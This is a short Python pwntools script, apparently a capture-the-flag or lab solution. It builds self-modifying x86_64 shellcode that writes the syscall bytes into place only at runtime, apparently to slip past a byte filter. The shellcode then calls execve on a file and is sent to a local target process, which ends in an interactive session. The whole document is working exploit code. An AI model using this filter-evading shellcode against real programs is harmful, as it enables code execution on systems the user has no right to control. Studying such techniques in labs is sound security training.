import glob
from pwn import *

# self modify shellcode
context.arch = "x86_64"
#context.log_level = "DEBUG"
assembly = """
	mov byte ptr [rip+syscall1], 0x0f
	mov byte ptr [rip+syscall1+1], 0x05
	lea rdi, [rip+flag]
	xor rsi, rsi
	xor rdx, rdx
	push 59
	pop rax
	syscall1:
		.byte 0x13
		.byte 0x37
	flag:
		.ascii "c"
"""

shellcode = asm(assembly)
p = process('/5')
print(p.recv(timeout=2).decode())
p.send(shellcode)
p.interactive()
#print(disasm(shellcode))